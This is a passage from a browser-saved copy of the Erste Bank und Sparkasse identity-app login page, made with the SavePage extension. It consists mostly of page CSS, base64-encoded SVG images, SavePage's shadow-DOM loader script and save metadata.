TkwLjQ5NiwxNTEzLjgxMi05MC40OTYsMTUxNC4xMTN6IE0tODYuMjc3LDE1MTEuNDAxYzAtMi4zMzMtMC41NzQtNC40ODQtMS43MjUtNi40NTQNCgkJYy0xLjE0OS0xLjk3LTIuNzA5LTMuNTMtNC42NzktNC42NzlzLTQuMTIxLTEuNzI1LTYuNDU0LTEuNzI1Yy0yLjMzMywwLTQuNDg0LDAuNTc1LTYuNDU0LDEuNzI1DQoJCWMtMS45NywxLjE0OS0zLjUyOSwyLjcwOS00LjY3OSw0LjY3OWMtMS4xNSwxLjk3LTEuNzI1LDQuMTIxLTEuNzI1LDYuNDU0czAuNTc1LDQuNDg0LDEuNzI1LDYuNDU0DQoJCWMxLjE0OSwxLjk3LDIuNzA5LDMuNTMsNC42NzksNC42NzljMS45NywxLjE0OSw0LjEyMSwxLjcyNCw2LjQ1NCwxLjcyNGMyLjMzMywwLDQuNDg0LTAuNTc1LDYuNDU0LTEuNzI0czMuNTI5LTIuNzA5LDQuNjc5LTQuNjc5DQoJCUMtODYuODUxLDE1MTUuODg1LTg2LjI3NywxNTEzLjczMy04Ni4yNzcsMTUxMS40MDF6Ii8+DQo8L2c+DQo8L3N2Zz4NCg==);
    content: " ";
    width: 3rem;
    height: 3rem;
    background-size: contain;
    background-repeat: no-repeat;
    position: absolute;
    top: -1rem;
    left:48%;
    left: calc(50% - 1.5rem);
}

.inputTAC {
    width: 4rem;
}

.inputSMSOTP {
    width: 6rem;
}

/*
** wenn der TAC dialog doch ein Overlay sein soll -> vorbereitung für iFrame lösung **

.fullsizeiframe{
    width:100%;
    height:100%;
    position:absolute;
    top:0;
    left:0;
    right:0;
    bottom:0;
    overflow:auto;
    z-index:999999;
}

body.tac{ background: transparent;}

** ENDE iframe Lösung **
*/

/************************************************************************
* TAC Form and TAC FORM Page  - 3.9.2014 - RWD
* TAN Form and TAN Form Page
************************************************************************/ 

@media only screen and (max-width : 900px){
    
    body.tac > .wrapper,
    body.tan > .wrapper,
    body.cardtan > .wrapper,
    body.heureka > .wrapper{
        width:90%;
    }

}

@media only screen and (max-width : 630px){
    
    body.tac > .wrapper,
    body.tan > .wrapper,
    body.cardtan > .wrapper,
    body.heureka > .wrapper{
        width:100%;
        margin-top:15% !important;
    }


    body.tac > .wrapper form > *,
    body.tan > .wrapper form > *,
    body.cardtan > .wrapper form > *,
    body.heureka > .wrapper form > *{
        display: block;
        margin:1rem auto;
    }

    body.tac .removewhite,
    body.tan .removewhite,
    body.cardtan .removewhite,
    body.heureka .removewhite{
        position:absolute;
        top:1rem;
        right:1rem;
    }
}
 
/************************************************************************
* Access Confirmation Page
************************************************************************/ 
form#confirmationForm{
    display:inline-block;
}

form#denialForm{
    display:inline-block;
}

#errorhash{
    text-align: right;
    color:#e9e9e9;
}

/************************************************************************
* FEDLOG-1791 Cookie Banner
************************************************************************/ 
.banner {
    color: #fff;
    background: #313a45;
    position: relative;
    z-index: 2;
}

.banner__inner {
    margin: 0 auto;
    text-align: left;
    overflow: hidden;
    padding: 1.5rem 4rem 1.5rem 2.4rem;
	max-width: 1170px;
}

.banner--cookie .banner__inner:before {
    content: "i";
}

.banner__inner:before {
    font-family: icons;
    font-size: 12px;
	font-weight:900;
    float: left;
    margin-left: -2.2rem;
    margin-right: .5rem;
    top: .1rem;
    position: relative;   
	background: #fff;
    border-radius: 100%;
    width: 18px;
    height: 18px;
    text-align: center;
}

.banner__close--cookie {
    width: auto;
    height: auto;
    float: right;
    margin-left: 1rem;
    margin-right: -4rem;
    position: static;
}

.banner__close {
    width: 2.2rem;
    height: 2.2rem;
    position: absolute;
    right: 1.5rem;
    top: 1.5rem;
    background: 0 0;
    border: 0;
    position: relative;
    cursor: pointer;
    display: inline-block;
    padding: 0;
    margin: 0;
    outline: 0;
    vertical-align: middle;
}

.banner-btn {
    width: auto;
    float: right;
    margin-left: 1rem;
    margin-right: -4rem;
    position: static;
    right: 1.5rem;
    color: #fff !important;
    background-color: #ff7900;
    border-top-color: #ff7900;
    border-bottom-color: #c66206;
    box-shadow: inset 0 -2px 0 0 #df6e07;
    padding: .5rem 1rem;
    display: inline-block;
    vertical-align: middle;
    text-align: center;
    font-weight: 900;
    line-height: 1;
    font-size: 1rem;
    border-radius: 4px;
    border: 0;
    border-top: 1px solid transparent;
    border-bottom: 1px solid transparent;
    cursor: pointer;
}
.banner-btn > span{
	color: #fff !important;
	font-weight:normal;
}

.banner__inner p {
    margin: 0;
	color: #fff;	
	font-size:15px;
}

.banner__inner p  > a{
   border-bottom: solid 2px transparent;
    transition: border-bottom .5s ease;
}

.banner__inner p  > a:hover{
	 border-bottom: solid 2px #fff;
	 transition: border-bottom .5s ease;
}

.banner__inner a {
    color: #fff;
    border-bottom-width: 2px;
    font-weight: 700;
    border-bottom: 2px solid transparent;
	text-decoration: none;
    transition: color .25s,border-color .25s;
    cursor: pointer;
}

.banner-wrapper {
    max-width: 120rem;
    margin: 0 auto;
    position: relative;
    padding-left: 1.5rem;
    padding-right: 1.5rem;
}

/************************************************************************
* Loading bar (eg_* classes) from DDPL:
* https://digitaldesign.erstegroup.com/en/DDPLHome/template/loader 
************************************************************************/
.eg_loader--blue {
    background-image: url(../images/blue.gif);
    background-image: url(../images/loading-bars_blue.svg);
    max-width: 3rem;
}

.eg_loader {
    width: 100%;
    height: 2.2rem;
    margin: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    background-size: contain;
    background-position: center center;
    background-repeat: no-repeat;
    min-height: 1rem;
}

.loader-container {
	height: 50px;
margin-top: 25px;
margin-left: 120px;
}

/* Browserswitch for IE11 */
@media all and (-ms-high-contrast:none) {
	*::-ms-backdrop, .eg_loader--blue {
	    background-image: /*savepage-url=../images/blue.gif*/ url();
	}
}

/* FEDLOG-2671: Highlight debug messages */
#debugMessage {
	color: #cc0000; 
}</style> 
	<script data-savepage-type="" type="text/plain"></script>
	<script data-savepage-type="" type="text/plain"></script>

<style id="savepage-cssvariables">
  :root {
    --savepage-url-4: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiIgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjMDA3OEI0Ij4KICAgIDxkZWZzPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj48IVtDREFUQVsKICAgICNmaXJzdC1wYXRoIHsKCQlhbmltYXRpb246IGRhc2ggMS4zcyBsaW5lYXIgaW5maW5pdGU7CiAgICB9CgoJI3NlY29uZC1wYXRoewoJICAgYW5pbWF0aW9uOiBkYXNoMSAxLjNzIGxpbmVhciBpbmZpbml0ZTsKCX0KCgkjdGhpcmQtcGF0aHsKCSAgIGFuaW1hdGlvbjogZGFzaDIgMS4zcyBsaW5lYXIgaW5maW5pdGU7Cgl9CgoJI2ZvdXJ0aC1wYXRoewoJICAgYW5pbWF0aW9uOiBkYXNoMyAxLjNzIGxpbmVhciBpbmZpbml0ZTsKCX0KCgkjZmlmdGgtcGF0aHsKCSAgIGFuaW1hdGlvbjogZGFzaDQgMS4zcyBsaW5lYXIgaW5maW5pdGU7Cgl9CgoKCUBrZXlmcmFtZXMgZGFzaCB7CgkJMCV7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLDIuNSkgdHJhbnNsYXRlM2QoMnB4LC05LjVweCwwKSA7CgkJfQoJCTUlewoJCXRyYW5zZm9ybTogc2NhbGUoMSwyLjUpIHRyYW5zbGF0ZTNkKDJweCwtOS41cHgsMCkgOwoJCX0KCQkzNSUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMnB4LDAsMCkgc2NhbGUoMSwxKSA7CgkJfQoJCTUwJSB7CgkJdHJhbnNmb3JtOiB0cmFuc2xhdGUzZCgycHgsMCwwKSBzY2FsZSgxLDEpOwoJCX0KCQk3NSUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMnB4LDAsMCkgc2NhbGUoMSwxKTsKCQl9CgkJMTAwJSB7CgkJdHJhbnNmb3JtOiB0cmFuc2xhdGUzZCgycHgsMCwwKSBzY2FsZSgxLDEpOwoJICB9Cgl9CgoJQGtleWZyYW1lcyBkYXNoMSB7CgkgIDAlIHsKCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZTNkKDdweCwwLDApIHNjYWxlKDEsMSk7CgkgIH0KCSAgMTUlLDIwJSwyNSUsMjklIHsKCQl0cmFuc2Zvcm06IHNjYWxlKDEsMi41KSB0cmFuc2xhdGUzZCg3cHgsLTkuNXB4LDApIDsKCSAgfQoJICA1MCUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoN3B4LDAsMCkgc2NhbGUoMSwxKTsKCSAgfQoJICA3NSUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoN3B4LDAsMCkgc2NhbGUoMSwxKTsKCSAgfQoJICAxMDAlIHsKCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZTNkKDdweCwwLDApIHNjYWxlKDEsMSk7CgkgIH0KCX0KCglAa2V5ZnJhbWVzIGRhc2gyIHsKCQkwJSB7CgkJdHJhbnNmb3JtOiB0cmFuc2xhdGUzZCgxMnB4LDAsMCkgc2NhbGUoMSwxKTsKCSAgfQoJICAyNSUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMTJweCwwLDApIHNjYWxlKDEsMSk7CgkgIH0KCSAgMzAlLDM1JSw0MCUsNDUlLDUwJSB7CgkJdHJhbnNmb3JtOiBzY2FsZSgxLDIuNSkgdHJhbnNsYXRlM2QoMTJweCwtOS41cHgsMCkgOwoJICB9CgkJNzUlIHsKCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZTNkKDEycHgsMCwwKSBzY2FsZSgxLDEpOwoJICB9CgkgIDEwMCUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMTJweCwwLDApIHNjYWxlKDEsMSk7CgkgIH0KCX0KCglAa2V5ZnJhbWVzIGRhc2gzIHsKCSAgMCUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMTdweCwwLDApIHNjYWxlKDEsMSk7CgkgIH0KCSAgMjUlIHsKCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZTNkKDE3cHgsMCwwKSBzY2FsZSgxLDEpOwoJICB9CgkgIDUwJSB7CgkJdHJhbnNmb3JtOiB0cmFuc2xhdGUzZCgxN3B4LDAsMCkgc2NhbGUoMSwxKTsKCSAgfQoJICA1NSUsNjAlLDc1JSB7CgkJdHJhbnNmb3JtOiBzY2FsZSgxLDIuNSkgdHJhbnNsYXRlM2QoMTdweCwtOS41cHgsMCkgOwoJICB9CgkgIDEwMCUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMTdweCwwLDApIHNjYWxlKDEsMSk7CgkgIH0KCX0KCglAa2V5ZnJhbWVzIGRhc2g0IHsKCSAgMCUgewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMjJweCwwLDApIHNjYWxlKDEsMSk7CgkgIH0KCSAgMjUlIHsKCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZTNkKDIycHgsMCwwKSBzY2FsZSgxLDEpOwoJICB9CgkgIDUwJSB7CgkJdHJhbnNmb3JtOiB0cmFuc2xhdGUzZCgyMnB4LDAsMCkgc2NhbGUoMSwxKTsKCSAgfQoJICAgNzAlIHsKCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZTNkKDIycHgsMCwwKSBzY2FsZSgxLDEpOwoJICB9CgkgIDgwJSwgOTAlLDEwMCUgewoJCXRyYW5zZm9ybTogc2NhbGUoMSwyLjUpIHRyYW5zbGF0ZTNkKDIycHgsLTkuNXB4LDApIDsKCSAgfQoJLyogIAkxMDAlewoJCXRyYW5zZm9ybTogdHJhbnNsYXRlM2QoMjJweCwwLDApIHNjYWxlKDEsMSk7CgkJfSAgKi8KCX0KICAgIF1dPjwvc3R5bGU+CiAgPC9kZWZzPgoKICA8cGF0aCB0cmFuc2Zvcm09InRyYW5zbGF0ZSgyKSIgZD0iTTAgMTIgVjIwIEgzLjIgVjEyeiIgaWQ9ImZpcnN0LXBhdGgiPgogIDwvcGF0aD4KICA8cGF0aCB0cmFuc2Zvcm09InRyYW5zbGF0ZSg4KSIgZD0iTTAgMTIgVjIwIEgzLjIgVjEyeiIgaWQ9InNlY29uZC1wYXRoIj4KICA8L3BhdGg+CiAgPHBhdGggdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTQpIiBkPSJNMCAxMiBWMjAgSDMuMiBWMTJ6IiBpZD0idGhpcmQtcGF0aCI+CiAgPC9wYXRoPgogIDxwYXRoIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIwKSIgZD0iTTAgMTIgVjIwIEgzLjIgVjEyeiIgaWQ9ImZvdXJ0aC1wYXRoIj4KICA8L3BhdGg+CiAgPHBhdGggdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjYpIiBkPSJNMCAxMiBWMjAgSDMuMiBWMTJ6IiBpZD0iZmlmdGgtcGF0aCI+CiAgPC9wYXRoPgo8L3N2Zz4K);
  }
</style>
<script id="savepage-shadowloader" type="text/javascript">
  "use strict";
  window.addEventListener("DOMContentLoaded",
  function(event) {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
</script>
<meta name="savepage-url" content="https://login.sparkasse.at/sts/oauth/authorize?client_id=georgeclient&response_type=token">
<meta name="savepage-title" content="Erste Bank und Sparkasse - s Identity-App Login">
<meta name="savepage-pubdate" content="Unknown">
<meta name="savepage-from" content="https://login.sparkasse.at/sts/oauth/authorize?client_id=georgeclient&response_type=token">
<meta name="savepage-date" content="Thu Dec 01 2022 21:24:25 GMT+0100 (Central European Standard Time)">
<meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
<meta name="savepage-version" content="33.1">
<meta name="savepage-comments" content="">
  </head>

<body class="en ismobile hasIcon">










	
<div class="wrapper" style="margin-top: 55.5px;">

	<div class="col1 col">
	
		
		    <h1 class="logo" id="Doppel-Logo_o_Claim"><img data-savepage-currentsrc="https://login.sparkasse.at/sts/images/logos/Doppel-Logo_o_Claim.svg" data-savepage-src="/sts/images/logos/Doppel-Logo_o_Claim.svg" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE1LjEuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iRWJlbmVfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiDQoJIHdpZHRoPSIzNzMuNjAycHgiIGhlaWdodD0iMzcuMDUxcHgiIHZpZXdCb3g9IjAgMCAzNzMuNjAyIDM3LjA1MSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzczLjYwMiAzNy4wNTE7Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxkZWZzPg0KCQk8cmVjdCBpZD0iU1ZHSURfMV8iIHg9Ii05MS44MzYiIHk9Ii0yOTcuOTgiIHdpZHRoPSI1OTUuMjgiIGhlaWdodD0iODQxLjg5Ii8+DQoJPC9kZWZzPg0KCTxjbGlwUGF0aCBpZD0iU1ZHSURfMl8iPg0KCQk8dXNlIHhsaW5rOmhyZWY9IiNTVkdJRF8xXyIgIHN0eWxlPSJvdmVyZmxvdzp2aXNpYmxlOyIvPg0KCTwvY2xpcFBhdGg+DQoJPHBhdGggc3R5bGU9ImNsaXAtcGF0aDp1cmwoI1NWR0lEXzJfKTtmaWxsOiNFMzA2MTM7IiBkPSJNMzU0LjU3NSw4LjIzMWMtMC45MjYtMC45NDItMS4zOTEtMi4wNzktMS4zOTEtMy40MQ0KCQljMC0xLjMwMSwwLjQ2NS0yLjQ0MSwxLjM3Ny0zLjM4M0MzNTUuNDg3LDAuNDg2LDM1Ni42MDgsMCwzNTcuOTA5LDBjMS4yNzcsMCwyLjM5NSwwLjQ3NiwzLjMyMywxLjQyNQ0KCQljMC45MzEsMC45NDMsMS40MDUsMi4wOTUsMS40MDUsMy4zOTZjMCwxLjMzMS0wLjQ2NSwyLjQ2OC0xLjM5NSwzLjQxYy0wLjkyOSwwLjk0OS0yLjA1NywxLjQyMy0zLjMzNCwxLjQyMw0KCQlDMzU2LjYwOCw5LjY1NCwzNTUuNDg3LDkuMTgsMzU0LjU3NSw4LjIzMSBNMzczLjYwMiwxOS4xMTh2LTIuOTMyYzAtMi43NzEtMi4yNDgtNS4wMjUtNS4wMjEtNS4wMjVoLTIxLjM0Ng0KCQljLTIuNzczLDAtNS4wMiwyLjI1NC01LjAyLDUuMDI1djExLjA0aDIzLjgxMVYyOC45aC0yMy44MTF2Mi45MjhjMCwyLjc3MywyLjI0Niw1LjAyMiw1LjAyLDUuMDIyaDIxLjM0Ng0KCQljMi43NzMsMCw1LjAyMS0yLjI0OSw1LjAyMS01LjAyMlYyMC43OWgtMjMuODA5di0xLjY3MkgzNzMuNjAyeiBNMTE0LjEwMSw4LjIzMWMtMC45MjYtMC45NDItMS4zOTEtMi4wNzktMS4zOTEtMy40MQ0KCQljMC0xLjMwMSwwLjQ2NS0yLjQ0MSwxLjM3Ny0zLjM4M0MxMTUuMDEzLDAuNDg2LDExNi4xMzMsMCwxMTcuNDM1LDBjMS4yNzcsMCwyLjM5NCwwLjQ3NiwzLjMyMiwxLjQyNQ0KCQljMC45MzIsMC45NDMsMS40MDYsMi4wOTUsMS40MDYsMy4zOTZjMCwxLjMzMS0wLjQ2NSwyLjQ2OC0xLjM5NCwzLjQxYy0wLjkzLDAuOTQ5LTIuMDU3LDEuNDIzLTMuMzM0LDEuNDIzDQoJCUMxMTYuMTMzLDkuNjU0LDExNS4wMTMsOS4xOCwxMTQuMTAxLDguMjMxIE0xMzMuMTI3LDE5LjExOHYtMi45MzJjMC0yLjc3MS0yLjI0OC01LjAyNS01LjAyMS01LjAyNUgxMDYuNzYNCgkJYy0yLjc3NCwwLTUuMDIsMi4yNTQtNS4wMiw1LjAyNXYxMS4wNGgyMy44MTFWMjguOUgxMDEuNzR2Mi45MjhjMCwyLjc3MywyLjI0Niw1LjAyMiw1LjAyLDUuMDIyaDIxLjM0Ng0KCQljMi43NzMsMCw1LjAyMS0yLjI0OSw1LjAyMS01LjAyMlYyMC43OWgtMjMuODA5di0xLjY3MkgxMzMuMTI3eiIvPg0KCTxwYXRoIHN0eWxlPSJjbGlwLXBhdGg6dXJsKCNTVkdJRF8yXyk7ZmlsbDojMDA0OTdCOyIgZD0iTTE1NS4wMjEsMTAuOTY2YzUuMzM3LDAsOC4xMDYsMC42MDEsOC4xMDYsMy4wOXYyLjUyOGgtNy4zMDMNCgkJYy0xLjk2NywwLTIuNTI5LDAuNTIxLTIuNTI5LDEuNTY0YzAsMy4wOTEsMTEuMTU2LDIuNDQ5LDExLjE1NiwxMS4xMTdjMCw0LjEzMy0yLjM2Nyw3Ljc4NS05LjU5MSw3Ljc4NQ0KCQljLTQuNzM1LDAtOC40NjctMC43NjItOC40NjctMy4wOXYtMi41MjhoOC42MjhjMS43NjUsMCwyLjYwOC0wLjU2MiwyLjYwOC0xLjgwNmMwLTMuMzcxLTExLjExNi0yLjcyOS0xMS4xMTYtMTEuNjM4DQoJCUMxNDYuNTEzLDE0LjA1NiwxNDkuMTIxLDEwLjk2NiwxNTUuMDIxLDEwLjk2NiBNMTY3LjI2LDEzLjQ1M2MwLTEuNTI0LDAuNjgyLTIuMjg3LDIuMjA3LTIuMjg3aDguMzQ3DQoJCWM1Ljg1OSwwLDkuMzEsMi41NjgsOS4zMSw3LjgyNWMwLDUuMDk3LTMuNDUxLDcuNDI1LTkuMzEsNy40MjVoLTQuMTM0djEwLjQzM2gtNi40MlYxMy40NTN6IE0xNzMuNjgsMTYuNTgzdjQuNjE0aDMuNjUzDQoJCWMyLjEyNiwwLDMuMzctMC40NDEsMy4zNy0yLjMyN2MwLTEuODQ2LTEuMjQ0LTIuMjg3LTMuMzctMi4yODdIMTczLjY4eiBNMjAwLjQ0NywxMS4wODZjMS4wODMsMCwxLjYwNCwwLjEyLDEuODQ1LDEuMDQzDQoJCWw1Ljk4LDIzLjcxOGMwLjA4LDAuMzYsMC4xMiwwLjcyMSwwLjEyLDEuMDAyaC01LjI1N2MtMS4wODQsMC0xLjQwNC0wLjA4LTEuNjA1LTAuOTYybC0xLjI0NS01LjEzN2gtNS45NzlsLTEuMTYzLDUuMTM3DQoJCWMtMC4yMDEsMC44ODItMC41MjMsMC45NjItMS42MDYsMC45NjJoLTUuMjE3YzAtMC4yODEsMC4wNC0wLjYwMSwwLjEyLTEuMDAybDUuOTgtMjMuNzE4YzAuMjQxLTAuOTIzLDAuNzYzLTEuMDQzLDEuODQ2LTEuMDQzDQoJCUgyMDAuNDQ3eiBNMTk1LjI3LDI1LjkzM2gzLjk3MmwtMS45MjYtOC4yMjZoLTAuMTZMMTk1LjI3LDI1LjkzM3ogTTIxMC4zOTgsMTMuNDUzYzAtMS41MjQsMC42ODMtMi4yODcsMi4yMDctMi4yODdoOC4zNDgNCgkJYzUuODU4LDAsOS4yMjksMi42ODgsOS4yMjksNy43NDVjMCwzLjQ5MS0xLjMyNCw1LjczOS00LjQ5NCw3LjAyMmw1LjAxNiw5Ljc5MmMwLjE2LDAuMzYyLDAuMzYxLDAuNzIzLDAuMzYxLDEuMTI0aC01LjUzOA0KCQljLTEuMTYzLDAtMS42NDYsMC0yLjIwNy0xLjE2NGwtNC40OTUtOS4yNjloLTIuMDA2djEwLjQzM2gtNi40MjFWMTMuNDUzeiBNMjE2LjgxOSwxNi41ODN2NC42MTRoMy42NTINCgkJYzEuODQ2LDAsMy4yOS0wLjI0LDMuMjktMi4yODdjMC0yLjAwNy0xLjQ0NC0yLjMyNy0zLjI5LTIuMzI3SDIxNi44MTl6IE0yMzkuNjkyLDIyLjkyNGw2LjQyLTEwLjU5NA0KCQljMC42MDMtMS4wNDQsMC45NjMtMS4xNjQsMS44MDctMS4xNjRoNi4wMmMwLDAuNDAxLTAuMDgsMC43MjMtMC4zMjEsMS4xMjRsLTcuMzg0LDExLjI3Nmw3Ljc0NSwxMi4xNTkNCgkJYzAuMiwwLjMyMiwwLjM2MSwwLjcyMywwLjM2MSwxLjEyNGgtNS44MTljLTEuMjAzLDAtMS41NjQtMC4wOC0yLjI0Ny0xLjE2NGwtNi41ODEtMTAuNTUzdjExLjcxN2gtNi40MjJWMTMuNDUzDQoJCWMwLTEuNTI0LDAuNjg0LTIuMjg3LDIuMjA4LTIuMjg3aDQuMjE0VjIyLjkyNHogTTI2OC44NjUsMTEuMDg2YzEuMDgzLDAsMS42MDQsMC4xMiwxLjg0NywxLjA0M2w1Ljk3OSwyMy43MTgNCgkJYzAuMDgsMC4zNiwwLjEyMSwwLjcyMSwwLjEyMSwxLjAwMmgtNS4yNThjLTEuMDg0LDAtMS40MDQtMC4wOC0xLjYwNS0wLjk2MmwtMS4yNDQtNS4xMzdoLTUuOTc5bC0xLjE2NCw1LjEzNw0KCQljLTAuMjAxLDAuODgyLTAuNTIxLDAuOTYyLTEuNjA1LDAuOTYyaC01LjIxN2MwLTAuMjgxLDAuMDQtMC42MDEsMC4xMi0xLjAwMmw1Ljk3OS0yMy43MThjMC4yNC0wLjkyMywwLjc2My0xLjA0MywxLjg0Ni0xLjA0Mw0KCQlIMjY4Ljg2NXogTTI2My42ODgsMjUuOTMzaDMuOTcybC0xLjkyNS04LjIyNmgtMC4xNjFMMjYzLjY4OCwyNS45MzN6IE0yODYuODQyLDEwLjk2NmM1LjMzOCwwLDguMTA1LDAuNjAxLDguMTA1LDMuMDl2Mi41MjgNCgkJaC03LjMwM2MtMS45NjcsMC0yLjUyOSwwLjUyMS0yLjUyOSwxLjU2NGMwLDMuMDkxLDExLjE1OCwyLjQ0OSwxMS4xNTgsMTEuMTE3YzAsNC4xMzMtMi4zNjksNy43ODUtOS41OTIsNy43ODUNCgkJYy00LjczNiwwLTguNDY4LTAuNzYyLTguNDY4LTMuMDl2LTIuNTI4aDguNjI4YzEuNzY2LDAsMi42MDgtMC41NjIsMi42MDgtMS44MDZjMC0zLjM3MS0xMS4xMTYtMi43MjktMTEuMTE2LTExLjYzOA0KCQlDMjc4LjMzNCwxNC4wNTYsMjgwLjk0MywxMC45NjYsMjg2Ljg0MiwxMC45NjYgTTMwNi43MDYsMTAuOTY2YzUuMzM4LDAsOC4xMDcsMC42MDEsOC4xMDcsMy4wOXYyLjUyOGgtNy4zMDUNCgkJYy0xLjk2NywwLTIuNTI3LDAuNTIxLTIuNTI3LDEuNTY0YzAsMy4wOTEsMTEuMTU2LDIuNDQ5LDExLjE1NiwxMS4xMTdjMCw0LjEzMy0yLjM2OSw3Ljc4NS05LjU5Miw3Ljc4NQ0KCQljLTQuNzM0LDAtOC40NjctMC43NjItOC40NjctMy4wOXYtMi41MjhoOC42MjdjMS43NjYsMCwyLjYwOS0wLjU2MiwyLjYwOS0xLjgwNmMwLTMuMzcxLTExLjExNy0yLjcyOS0xMS4xMTctMTEuNjM4DQoJCUMyOTguMTk4LDE0LjA1NiwzMDAuODA3LDEwLjk2NiwzMDYuNzA2LDEwLjk2NiBNMzE4Ljk0NCwxMy40NTNjMC0xLjUyNCwwLjY4NC0yLjI4NywyLjIwNy0yLjI4N2gxNC4wNDd2My4xNw0KCQljMCwxLjUyNS0wLjc2NCwyLjI0OC0yLjI4OCwyLjI0OGgtNy41NDR2NC42MTRoOC40Mjh2NS4yMThoLTguNDI4djUuMDE2aDEwLjAzM3YzLjE3YzAsMS41MjUtMC43NjQsMi4yNDctMi4yODksMi4yNDdoLTExLjk1OQ0KCQljLTEuNTIzLDAtMi4yMDctMC43NjItMi4yMDctMi4yODdWMTMuNDUzeiBNMCwxMy40NTRjMC0xLjUyNSwwLjY4My0yLjI4OCwyLjIwNy0yLjI4OGgxNC4wNDZ2My4xNzENCgkJYzAsMS41MjUtMC43NjIsMi4yNDctMi4yODcsMi4yNDdINi40MjF2NC42MTVoOC40Mjh2NS4yMTdINi40MjF2NS4wMTdoMTAuMDMydjMuMTY5YzAsMS41MjYtMC43NjEsMi4yNDgtMi4yODcsMi4yNDhIMi4yMDcNCgkJQzAuNjgzLDM2Ljg1LDAsMzYuMDg3LDAsMzQuNTYyVjEzLjQ1NHogTTE5LjA2NiwxMy40NTRjMC0xLjUyNSwwLjY4Mi0yLjI4OCwyLjIwOC0yLjI4OGg4LjM0NmM1Ljg2LDAsOS4yMzEsMi42ODksOS4yMzEsNy43NDYNCgkJYzAsMy40OTEtMS4zMjQsNS43MzgtNC40OTUsNy4wMjJsNS4wMTYsOS43OTJjMC4xNiwwLjM2MSwwLjM2MiwwLjcyMywwLjM2MiwxLjEyNGgtNS41MzhjLTEuMTY0LDAtMS42NDYsMC0yLjIwNy0xLjE2NA0KCQlsLTQuNDk2LTkuMjdoLTIuMDA2VjM2Ljg1aC02LjQyMVYxMy40NTR6IE0yNS40ODcsMTYuNTgzdjQuNjE1aDMuNjUyYzEuODQ2LDAsMy4yOTEtMC4yNDEsMy4yOTEtMi4yODcNCgkJYzAtMi4wMDctMS40NDUtMi4zMjgtMy4yOTEtMi4zMjhIMjUuNDg3eiBNNDkuMzY4LDEwLjk2NmM1LjMzOCwwLDguMTA3LDAuNjAyLDguMTA3LDMuMDl2Mi41MjhoLTcuMzA0DQoJCWMtMS45NjYsMC0yLjUyOCwwLjUyMi0yLjUyOCwxLjU2NWMwLDMuMDksMTEuMTU2LDIuNDQ4LDExLjE1NiwxMS4xMTdjMCw0LjEzMy0yLjM2Nyw3Ljc4NS05LjU5MSw3Ljc4NQ0KCQljLTQuNzM1LDAtOC40NjctMC43NjMtOC40NjctMy4wOXYtMi41MjhoOC42MjdjMS43NjYsMCwyLjYwOS0wLjU2MiwyLjYwOS0xLjgwN2MwLTMuMzctMTEuMTE2LTIuNzI5LTExLjExNi0xMS42MzcNCgkJQzQwLjg2MSwxNC4wNTYsNDMuNDY5LDEwLjk2Niw0OS4zNjgsMTAuOTY2IE03Ni40NiwxMS4xNjZ2My4yNTFjMCwxLjQ4NS0wLjc2MiwyLjE2Ny0yLjI0NywyLjE2N2gtMy4xNzFWMzYuODVoLTYuNDIxVjE2LjU4Mw0KCQloLTUu